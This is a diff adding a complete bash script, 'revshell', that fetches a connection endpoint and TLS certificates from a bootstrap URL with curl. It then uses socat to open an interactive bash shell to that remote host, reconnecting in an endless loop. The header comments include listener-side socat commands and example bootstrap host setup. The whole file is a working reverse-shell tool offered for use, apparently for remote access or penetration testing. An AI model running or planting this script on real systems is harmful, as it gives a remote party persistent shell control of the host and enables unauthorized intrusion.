@@ -1,0 +1,93 @@
+#!/usr/bin/env bash
+#
+# revshell - Unsneaky and somewhat ghetto reverse shell with mutual TLS authentication, using cURL and socat.
+# Fetches reverse connection endpoint, CA certificate and client certficiate from specified bootstrap URL 
+#
+# Client usage examples:
+#
+# $ revshell "https://example.com/bd7751b6ec39"
+#
+# OR
+#
+# $ export REVSHELL_BOOTSTRAP_URL="https://example.com"; export REVSHELL_BOOTSTRAP_TOKEN="bd7751b6ec39"
+# $ revshell 
+#
+# Bootstrap host usage example:
+# 
+# $ mkdir /var/www/html/bd7751b6ec39
+# $ echo -n "example.com:443" > /var/www/html/bd7751b6ec39/endpoint
+# $ cp ca/keys/ca.crt /var/www/html/bd7751b6ec39/ca
+# $ cat ca/keys/example.com.crt ca/keys/example.com.key > /var/www/html/bd7751b6ec39/cert
+#
+# Server usage example:
+# 
+# $ cat ca/keys/example.com.crt ca/keys/example.com.key > server.pem
+# $ socat file:`tty`,raw,echo=0 openssl-listen:443,reuseaddr,cert=server.pem,cafile=ca/keys/ca.crt
+#
+# For more information, see "https://github.com/doctor-love/revshell
+
+function wait_forever {
+	while true; do sleep 300s; echo "INFO: Still alive at $(date)..."; done
+
+}
+
+which grep curl socat &> /dev/null
+
+if [[ "${?}" != "0" ]]; then
+	echo "ERROR: Could not find dependencies (grep, curl and socat) - sleeping..."
+	wait_forever
+
+fi
+
+
+echo "${1}" | grep --quiet -E '^http.+'
+
+if [[ "${?}" == "0" ]]; then
+	echo "INFO: Using first argument as bootstrap URL"
+       BASE_URL="${1}"	
+
+elif [[ -z "${REVSHELL_BOOTSTRAP_URL}" ]] || [[ -z "${REVSHELL_BOOTSTRAP_TOKEN}" ]]; then
+	echo "INFO: Environment variables or first argument not configured for reverse shell - sleeping..."
+	wait_forever
+
+else
+	BASE_URL="${REVSHELL_BOOTSTRAP_URL}/${REVSHELL_BOOTSTRAP_TOKEN}"
+
+fi
+
+BASE_PATH="${HOME}/revshell"
+
+if ! [[ -d "${BASE_PATH}" ]]; then
+	echo "INFO: Creating base directory for reverse shell"
+	mkdir "${BASE_PATH}"
+
+fi
+
+if ! [[ -f "${BASE_PATH}/endpoint" ]] || ! [[ -f "${BASE_PATH}/ca" ]] || ! [[ -f "${BASE_PATH}/cert" ]]; then
+	echo "INFO: Downloading reverse shell configuration files from \"${BASE_URL}\"..."
+
+	curl -o "${BASE_PATH}/#1" "${BASE_URL}/{endpoint,ca,cert}"
+
+	if [[ "${?}" != "0" ]]; then
+		echo
+		echo "ERROR: Failed to download configuration files - sleeping..."
+		wait_forever
+
+	fi
+	
+	echo
+
+fi
+
+ENDPOINT="$(cat ${BASE_PATH}/endpoint)"
+
+echo "INFO: Starting reverse shell to \"${ENDPOINT}\"..."
+
+while true; do
+	socat exec:'bash -li',pty,stderr,setsid,sigint,sane \
+	"openssl-connect:${ENDPOINT},cert=${BASE_PATH}/cert,cafile=${BASE_PATH}/ca"
+
+	echo "INFO: Reconnecting to \"${ENDPOINT}\" at $(date --date '10 seconds')..."
+	sleep 10s
+
+done
